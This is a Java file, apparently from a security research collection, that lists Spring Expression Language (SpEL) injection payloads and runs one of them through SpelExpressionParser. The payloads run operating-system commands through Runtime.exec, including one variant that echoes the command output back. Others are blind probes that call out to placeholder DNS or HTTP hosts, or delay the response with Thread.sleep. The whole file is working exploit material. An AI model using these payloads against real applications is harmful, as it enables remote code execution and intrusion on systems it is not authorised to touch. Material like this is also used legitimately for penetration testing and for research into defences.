package com.example.spelattack;

import org.springframework.expression.spel.standard.SpelExpressionParser;

/**
 * @author Whoopsunix
 */
public class SPEL {
    public static void main(String[] args) {
        /**
         * 命令执行
         */
        // 无回显
        String runtime = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator.app')";
        // 回显
        String runtimeEcho = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter(\"\\\\A\").next()";

        /**
         * 探测
         */
        String DNSLOG = "T(java.net.InetAddress).getByName('DNSLOG')";
        String HTTPLOG = "new java.net.URL('http://host').getContent()";
        String HTTPLOG2 = "new org.springframework.web.client.RestTemplate().headForHeaders('http://host')";
        // 延时
        String sleep = "T(java.lang.Thread).sleep(10000)";

        /**
         * todo 类加载
         */


        Object obj = spel(sleep);
        System.out.println(obj);
    }

    public static Object spel(String payload) {
        return new SpelExpressionParser().parseExpression(payload).getValue();
    }
}
